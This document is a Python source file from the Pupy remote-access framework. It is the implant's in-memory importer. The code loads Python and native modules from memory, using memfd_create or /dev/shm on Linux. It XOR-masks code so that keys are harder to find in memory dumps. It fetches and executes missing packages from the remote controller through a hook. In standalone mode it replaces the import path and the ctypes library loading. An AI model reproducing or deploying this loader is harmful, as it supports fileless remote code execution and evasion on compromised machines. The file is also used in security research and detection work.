# -*- coding: utf-8 -*-
# ---------------------------------------------------------------
# Copyright (c) 2015, Nicolas VERDIER (contact@n1nj4.eu)
# All rights reserved.
#
# Redistribution and use in source and binary forms, with or without modification, are permitted provided that the following conditions are met:
#
# 1. Redistributions of source code must retain the above copyright notice, this list of conditions and the following disclaimer.
#
# 2. Redistributions in binary form must reproduce the above copyright notice, this list of conditions and the following disclaimer in the documentation and/or other materials provided with the distribution.
#
# 3. Neither the name of the copyright holder nor the names of its contributors may be used to endorse or promote products derived from this software without specific prior written permission.
#
# THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE
# ---------------------------------------------------------------
# This module uses the builtins modules pupy and _memimporter to load python modules and packages from memory, including .pyd files (windows only)
# Pupy can dynamically add new modules to the modules dictionary to allow remote importing of python modules from memory !
#
import sys, imp, marshal, gc

__debug = False
__trace = False
__dprint_method = None

modules = {}
dlls = set()

def dprint(msg):
    global __debug
    global __dprint_method

    if __dprint_method is None:
        if __debug:
            print msg
    else:
        __dprint_method(msg)

def loadpy(src, dst, masked=False):
    content = src
    if masked:
        # Poors man "obfuscation", just to reduce (a bit) amount of our
        # plaintext keys in mem dump
        content = bytearray(len(src))
        for i,x in enumerate(src):
            content[i] = (x^((2**((65535-i)%65535))%251))
        content = buffer(content)

    exec (marshal.loads(content), dst)
    del content

def memtrace(msg):
    global __debug
    global __trace
    if __debug and __trace:
        import time
        import os
        import cPickle
        import gc

        msg = msg or 'unknown'
        msg = msg.replace('/', '_')

        gc.collect()
        snapshot = __trace.take_snapshot()

        if not os.path.isdir('/tmp/pupy-traces'):
            os.makedirs('/tmp/pupy-traces')

        with open('/tmp/pupy-traces/{}-{}'.format(time.time(), msg), 'w+b') as out:
            cPickle.dump(snapshot, out)

try:
    import _memimporter
    builtin_memimporter = True
    allow_system_packages = False

except ImportError:
    builtin_memimporter = False
    allow_system_packages = True
    import ctypes
    import platform
    if sys.platform!="win32":
        libc = ctypes.CDLL(None)
        syscall = libc.syscall
    from tempfile import mkstemp
    from os import chmod, unlink, close, write

    class MemImporter(object):
        def __init__(self):
            self.dir = None
            self.memfd = None
            self.ready = False

            if platform.system() == 'Linux':
                maj, min = platform.release().split('.')[:2]
                if maj >= 3 and min >= 13:
                    __NR_memfd_create = None
                    machine = platform.machine()
                    if machine == 'x86_64':
                        __NR_memfd_create = 319
                    elif machine == '__i386__':
                        __NR_memfd_create = 356

                    if __NR_memfd_create:
                        self.memfd = lambda: syscall(__NR_memfd_create, 'heap', 0x1)
                        self.ready = True
                        return

            for dir in ['/dev/shm', '/tmp', '/var/tmp', '/run']:
                try:
                    fd, name = mkstemp(dir=dir)
                except:
                    continue

                try:
                    chmod(name, 0777)
                    self.dir = dir
                    self.ready = True
                    break

                finally:
                    close(fd)
                    unlink(name)

        def import_module(self, data, initfuncname, fullname, path):
            return self.load_library(data, fullname, dlopen=False, initfuncname=initfuncname)


        def load_library(self, data, fullname, dlopen=True, initfuncname=None):
            fd = -1
            closefd = True

            result = False

            if self.memfd:
                fd = self.memfd()
                if fd != -1:
                    name = '/proc/self/fd/{}'.format(fd)
                    closefd = False

            if fd == -1:
                fd, name = mkstemp(dir=self.dir)

            try:
                write(fd, data)
                if dlopen:
                    result = ctypes.CDLL(fullname)
                else:
                    if initfuncname:
                        result = imp.load_dynamic(initfuncname[4:], name)
                    else:
                        result = imp.load_dynamic(fullname, name)

            except Exception as e:
                self.dir = None
                raise e

            finally:
                if closefd:
                    close(fd)
                    unlink(name)

            return result

    _memimporter = MemImporter()
    builtin_memimporter = _memimporter.ready

remote_load_package = None
remote_print_error = None

try:
    import pupy
    if hasattr(pupy, 'get_modules') and not modules:
        modules = pupy.get_modules()
except ImportError:
    pass

def get_module_files(fullname):
    """ return the file to load """
    global modules
    path = fullname.replace('.','/')

    files = [
        module for module in modules.iterkeys() \
        if module.rsplit(".",1)[0] == path or any([
            path+'/__init__'+ext == module for ext in [
                '.py', '.pyc', '.pyo', '.pye'
            ]
        ])
    ]

    if len(files) > 1:
        # If we have more than one file, than throw away dlls
        files = [ x for x in files if not x.endswith('.dll') ]

    return files

def pupy_add_package(pkdic, compressed=False, name=None):
    """ update the modules dictionary to allow remote imports of new packages """
    import cPickle
    import zlib

    global modules

    if compressed:
        pkdic = zlib.decompress(pkdic)

    module = cPickle.loads(pkdic)

    dprint('Adding files: {}'.format(module.keys()))

    modules.update(module)

    if name:
        try:
            __import__(name)
        except:
            pass

    gc.collect()

    memtrace(name)

def has_module(name):
    global modules

    if name in sys.modules or name in modules:
        return True

    fsname = name.replace('.', '/')
    fsnames = (
        '{}.py'.format(fsname),
        '{}/__init__.py'.format(fsname),
        '{}.pyd'.format(fsname),
        '{}.so'.format(fsname)
    )

    for module in modules:
        if module.startswith(fsnames):
            return True

    return False

def has_dll(name):
    global dlls
    return name in dlls

def new_modules(names):
    return [
        name for name in names if not has_module(name)
    ]

def new_dlls(names):
    return [
        name for name in names if not has_dll(name)
    ]

def load_dll(name, buf):
    global dlls
    if name in dlls:
        return True

    import pupy
    if hasattr(pupy, 'load_dll'):
        if pupy.load_dll(name, buf):
            dlls.add(name)
            return True

    return False

def invalidate_module(name):
    import pupy

    global modules
    global __debug

    for item in modules.keys():
        if item == name or item.startswith(name+'.'):
            dprint('Remove {} from pupyimporter.modules'.format(item))
            del modules[item]

    for item in sys.modules.keys():
        if not (item == name or item.startswith(name+'.')):
            continue

        mid = id(sys.modules[item])

        dprint('Remove {} from sys.modules'.format(item))
        del sys.modules[item]

        if hasattr(pupy, 'namespace'):
            dprint('Remove {} from rpyc namespace'.format(item))
            pupy.namespace.__invalidate__(item)

        if __debug:
            for obj in gc.get_objects():
                if id(obj) == mid:
                    dprint('Module {} still referenced by {}'.format(
                        item, [ id(x) for x in gc.get_referrers(obj) ]
                    ))

    gc.collect()

class DummyPackageLoader(object):
    def load_module(self, fullname):
        return sys.modules[fullname]

class PupyPackageLoader(object):
    def __init__(self, fullname, contents, extension, is_pkg, path):
        self.fullname = fullname
        self.contents = contents
        self.extension = extension
        self.is_pkg = is_pkg
        self.path = path
        self.archive = '' #need this attribute

    def load_module(self, fullname):
        global remote_print_error

        imp.acquire_lock()
        try:
            dprint('loading module {}'.format(fullname))
            if fullname in sys.modules:
                return sys.modules[fullname]

            mod = None
            if self.extension=='py':
                mod = imp.new_module(fullname)
                mod.__name__ = fullname
                mod.__file__ = 'pupy://{}'.format(self.path)
                if self.is_pkg:
                    mod.__path__ = [mod.__file__.rsplit('/',1)[0]]
                    mod.__package__ = fullname
                else:
                    mod.__package__ = fullname.rsplit('.', 1)[0]
                code = compile(self.contents, mod.__file__, 'exec')
                sys.modules[fullname] = mod
                exec (code, mod.__dict__)

            elif self.extension in ('pyc','pyo','pye'):
                mod = imp.new_module(fullname)
                mod.__name__ = fullname
                mod.__file__ = 'pupy://{}'.format(self.path)
                if self.is_pkg:
                    mod.__path__ = [mod.__file__.rsplit('/',1)[0]]
                    mod.__package__ = fullname
                else:
                    mod.__package__ = fullname.rsplit('.', 1)[0]
                sys.modules[fullname] = mod
                try:
                    dprint('Load {} from marshalled file ({})'.format(fullname, self.extension))
                    loadpy(self.contents[8:], mod.__dict__, self.extension == 'pye')
                except Exception, e:
                    dprint('Load {} failed: Exception: {}'.format(fullname, e))

            elif self.extension in ('dll', 'pyd', 'so'):
                initname = "init" + fullname.rsplit(".",1)[-1]
                path = self.fullname.rsplit('.', 1)[0].replace(".",'/') + "." + self.extension
                dprint('Loading {} from memory'.format(fullname))
                dprint('init={} fullname={} path={}'.format(initname, fullname, path))
                mod = _memimporter.import_module(self.contents, initname, fullname, path)
                if mod:
                    mod.__name__=fullname
                    mod.__file__ = 'pupy://{}'.format(self.path)
                    mod.__package__ = fullname.rsplit('.',1)[0]
                    sys.modules[fullname] = mod

            try:
                memtrace(fullname)
            except Exception, e:
                dprint('memtrace failed: {}'.format(e))

        except Exception as e:
            if fullname in sys.modules:
                del sys.modules[fullname]

            import traceback

            if remote_print_error:
                try:
                    dprint('Call remote_print_error() - error loading package - start'.format())
                    remote_print_error("Error loading package {} ({} pkg={}) : {}".format(
                        fullname, self.path, self.is_pkg, str(traceback.format_exc())))
                    dprint('Call remote_print_error() - error loading package - complete'.format())
                except:
                    pass
            else:
                dprint('PupyPackageLoader: Error importing %s : %s'%(fullname, traceback.format_exc()))

            raise e

        finally:
            self.contents = None
            imp.release_lock()
            gc.collect()

        return sys.modules[fullname]

class PupyPackageFinderImportError(ImportError):
    pass

class PupyPackageFinder(object):
    search_lock = None
    search_set = set()

    def __init__(self, path=None):
        if path and not path.startswith('pupy://'):
            raise PupyPackageFinderImportError()

    def find_module(self, fullname, path=None, second_pass=False):
        if fullname.startswith('exposed_'):
            return None

        global modules
        global remote_load_package

        dprint('Find module: {}/{}/{}'.format(fullname, path, second_pass))

        if not second_pass:
            imp.acquire_lock()

        selected = None

        try:
            files=[]
            if fullname in ( 'pywintypes', 'pythoncom' ):
                fullname = fullname + '27.dll'
                files = [ fullname ]
            else:
                files = get_module_files(fullname)

            dprint('[L] find_module({},{}) in {})'.format(fullname, path, files))
            if not builtin_memimporter:
                files = [
                    f for f in files if not f.lower().endswith(('.pyd','.dll','.so'))
                ]

            if not files:
                dprint('{} not found in {}: not in {} files'.format(
                    fullname, files, len(files)))

                if remote_load_package and not second_pass:
                    parts = fullname.split('.')[:-1]

                    for i in xrange(len(parts)):
                        part = '.'.join(parts[:i+1])
                        if part in modules or part in sys.modules:
                            return None

                    if not PupyPackageFinder.search_lock is None:
                        with PupyPackageFinder.search_lock:
                            if fullname in PupyPackageFinder.search_set:
                                return None
                            else:
                                PupyPackageFinder.search_set.add(fullname)

                    try:
                        dprint('Remote load package {}'.format(fullname))
                        packages, dlls = remote_load_package(fullname)
                        dprint('Remote load package {} - success'.format(fullname))
                        if not packages and not dlls:
                            dprint('Remote load package {} - not found'.format(fullname))
                        else:
                            if dlls:
                                dlls = pupy.obtain(dlls)
                                for name, blob in dlls:
                                    load_dll(name, blob)

                            if packages:
                                pupy_add_package(packages, True, fullname)

                            if fullname in sys.modules:
                                return DummyPackageLoader()

                            return self.find_module(fullname, second_pass=True)

                    except Exception as e:
                        dprint('Exception: {}'.format(e))

                    finally:
                        if not PupyPackageFinder.search_lock is None:
                            with PupyPackageFinder.search_lock:
                                PupyPackageFinder.search_set.remove(fullname)

                return None

            criterias = [
                lambda f: any([
                    f.endswith('/__init__'+ext) for ext in [
                        '.pye', '.pyo', '.pyc', '.py'
                    ]
                ]),
                lambda f: any([
                    f.endswith(ext) for ext in [
                        '.pye', '.pyo', '.pyc'
                    ]
                ]),
                lambda f: any([
                    f.endswith(ext) for ext in [
                        '.pyd', '.py', '.so', '.dll'
                    ]
                ]),
            ]

            selected = None
            for criteria in criterias:
                for pyfile in files:
                    if criteria(pyfile) and pyfile in modules:
                        selected = pyfile
                        break

            if not selected:
                dprint('{} not selected from {}'.format(fullname, files))
                return None

            content = modules[selected]
            dprint('{} found in "{}" / size = {}'.format(fullname, selected, len(content)))

            extension = selected.rsplit(".",1)[1].strip().lower()
            is_pkg = any([
                selected.endswith('/__init__'+ext) for ext in [ '.pye', '.pyo', '.pyc', '.py' ]
            ])

            dprint('--> Loading {} ({}) package={}'.format(
                fullname, selected, is_pkg))

            return PupyPackageLoader(fullname, content, extension, is_pkg, selected)

        except Exception as e:
            dprint('--> Loading {} failed: {}/{}'.format(fullname, e, type(e)))
            if 'traceback' in sys.modules:
                import traceback
                traceback.print_exc(e)
            raise e

        finally:
            # Don't delete network.conf module
            if selected and \
              not selected.startswith(('network/conf', 'pupytasks')) and \
              selected in modules:
                dprint('[L] {} remove {} from bundle / count = {}'.format(fullname, selected, len(modules)))
                del modules[selected]

            if not second_pass:
                imp.release_lock()

            gc.collect()

def native_import(name):
    if not PupyPackageFinder.search_lock is None:
        with PupyPackageFinder.search_lock:
            if name in PupyPackageFinder.search_set:
                return False
            else:
                PupyPackageFinder.search_set.add(name)

    try:
        __import__(name)
        return True

    except:
        return False

    finally:
        if not PupyPackageFinder.search_lock is None:
            with PupyPackageFinder.search_lock:
                PupyPackageFinder.search_set.remove(name)

def register_package_request_hook(hook):
    global remote_load_package

    remote_load_package = hook

def register_package_error_hook(hook):
    global remote_print_error
    import rpyc

    remote_print_error = rpyc.async(hook)

def unregister_package_error_hook():
    global remote_print_error
    remote_print_error = None

def unregister_package_request_hook():
    global remote_load_package
    remote_load_package = None

def install(debug=None, trace=False):
    global __debug
    global __trace
    global __dprint_method
    global modules

    if debug:
       __debug = True

    if trace:
        __trace = trace

    gc.set_threshold(128)

    if allow_system_packages:
        dprint('Install pupyimporter + local packages')

        sys.path_hooks.append(PupyPackageFinder)
        sys.path.append('pupy://')

    else:
        dprint('Install pupyimporter - standalone')

        sys.meta_path = []
        sys.path = []
        sys.path_hooks = []
        sys.path_hooks = [PupyPackageFinder]
        sys.path.append('pupy://')
        sys.path_importer_cache.clear()

        import platform
        platform._syscmd_uname = lambda *args, **kwargs: ''
        platform.architecture = lambda *args, **kwargs: (
            '32bit' if pupy.get_arch() == 'x86' else '64bit', ''
        )

    try:
        if __trace:
            __trace = __import__('tracemalloc')

        if __debug and __trace:
            dprint('tracemalloc enabled')
            __trace.start(10)

    except Exception, e:
        dprint('tracemalloc init failed: {}'.format(e))
        __trace = None

    import ctypes
    import ctypes.util
    import os
    import threading

    PupyPackageFinder.search_lock = threading.Lock()

    ctypes._system_dlopen = ctypes._dlopen
    ctypes.util._system_find_library = ctypes.util.find_library

    if hasattr(ctypes.util, '_findLib_gcc'):
        ctypes.util._findLib_gcc = lambda name: None

    def pupy_make_path(name):
        if not name:
            return
        if 'pupy:' in name:
            name = name[name.find('pupy:')+5:]
            name = os.path.relpath(name)
            name = '/'.join([
                x for x in name.split(os.path.sep) if x and not x in ( '.', '..' )
            ])

        return name

    def pupy_find_library(name):
        pupyized = pupy_make_path(name)
        if pupyized in modules:
            dprint("FIND LIBRARY: {} => {}".format(name, pupyized))
            return pupyized
        else:
            return ctypes.util._system_find_library(name)

    def pupy_dlopen(name, *args, **kwargs):
        dprint("ctypes dlopen: {}".format(name))
        name = pupy_make_path(name)
        dprint("ctypes dlopen / pupyized: {}".format(name))

        if name in modules:
            if hasattr(_memimporter, 'load_library'):
                try:
                    return _memimporter.load_library(modules[name], name)
                except:
                    pass
            elif hasattr(pupy, 'load_dll'):
                try:
                    return pupy.load_dll(name, modules[name])
                except:
                    pass

        return ctypes._system_dlopen(name, *args, **kwargs)

    if 'pupy' in sys.modules and hasattr(pupy, 'find_function_address'):
        ctypes.CDLL_ORIG = ctypes.CDLL

        class PupyCDLL(ctypes.CDLL_ORIG):
            def __init__(self, name, **kwargs):
                super(PupyCDLL, self).__init__(name, **kwargs)
                self._FuncPtr_orig = self._FuncPtr
                self._FuncPtr = self._find_function_address
                self._name = pupy_make_path(self._name)
                dprint('CDLL({})'.format(self._name))

            def _find_function_address(self, search_tuple):
                name, handle = search_tuple
                dprint("PupyCDLL._find_function_address: {}".format(name))
                if not type(name) in (str, unicode):
                    return self._FuncPtr_orig(search_tuple)
                else:
                    addr = pupy.find_function_address(self._name, name)
                    dprint("PupyCDLL._find_function_address: {} = {}".format(name, addr))
                    if addr:
                        return self._FuncPtr_orig(addr)
                    else:
                        return self._FuncPtr_orig(search_tuple)

        ctypes.CDLL = PupyCDLL

    ctypes._dlopen = pupy_dlopen
    ctypes.util.find_library = pupy_find_library

    if sys.platform == 'win32':
        import pywintypes

    import logging
    logger = logging.getLogger('ppi')
    __dprint_method = logger.debug

    dprint('pupyimporter initialized')
